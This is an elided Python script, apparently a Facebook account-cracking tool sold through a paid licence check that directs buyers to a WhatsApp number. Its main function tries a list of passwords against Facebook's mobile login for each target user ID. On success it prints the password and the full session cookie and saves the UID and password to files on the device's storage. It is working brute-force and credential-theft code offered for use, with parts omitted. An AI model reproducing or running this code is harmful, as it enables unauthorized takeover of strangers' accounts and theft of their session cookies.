...
def approval():
  ...
  id = "-".join(uuid)
  try:
    httpCaht = requests.get('https://github.com/Hatela-Dlewix/Fuckery-Brand/blob/main/approv.txt').text
    if id in httpCaht:
      ...
      print("\33[1;37m----------------------------------------------")
      print("\33[1;37mFor 30 Days Approval Price 150")
      print('\33[1;37m----------------------------------------------')
      print ('IF U DONT WANT TO BUY PLS DONT PRESS ENTER')
      input('IF U WANT TO BUY THEN PRESS ENTER ')
      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+923356134860?text='+tks),approval()
      time.sleep(1)
      approval()
  except:
    sys.exit()
...
dP     dP             dP            dP          
88     88             88            88          
88aaaaa88a .d8888b. d8888P .d8888b. 88 .d8888b. 
88     88  88'  `88   88   88ooood8 88 88'  `88 
88     88  88.  .88   88   88.  ... 88 88.  .88 
dP     dP  `88888P8   dP   `88888P' dP `88888P8 
oooooooooooooooooooooooooooooooooooooooooooooooo
                                                

__________________
AUTHOR    : Hatela
FACEBOOK : Hatela D'lewix
VERSION    : 1.0
                                   [THE DEVIL]
...
def cek_apk(session,coki):
    ...
    #____________#
def xyz():
    #os.system("play-audio WELCOME_TO_Devil_BOOT_818.mp3")
    os.getuid
...
def free(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            "li":re.search('name="li" value="(.*?)"', str(x_fb)).group(1),
            "try_number":"0",
            ...
            lo = session.post('https://x.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,cache=header_xfb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('\r\033[1;32m[√]---------------------[D-ox-OK]--------------------[√]\nEMAIL : '+uid+'\nUID   : '+cid+' √ '+ps+ '\nCOOKIE   : '+coki+'\n[√]---------------------------------------------------[√]')
                cek_apk(session,coki)
                open('/sdcard/D-ox-OK.txt', 'a').write(cid+' | '+ps+'\n')
                oks.append(cid)
                break
                ...
                cid=coki[24:39]
                Red = '\033[1;31m'
                print(f'\r{Red}[×]--------------------[D-ox-CP]---------------------[×]\nEMAIL : '+uid+'\nUID   : '+cid+' √ '+ps+ '\n[×]---------------------------------------------------[×]\033[1;97m')
                open('/sdcard/D-ox-CP.txt', 'a').write(cid+' | '+ps+'\n')
                cps.append(cid)
                break
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[D-ox] [%s]\33[1;97m [OK:%s~CP:%s]'%(loop,len(oks),len(cps))), 
        sys.stdout.flush()
        checks(oks,cps,twf)
    except:
        pass
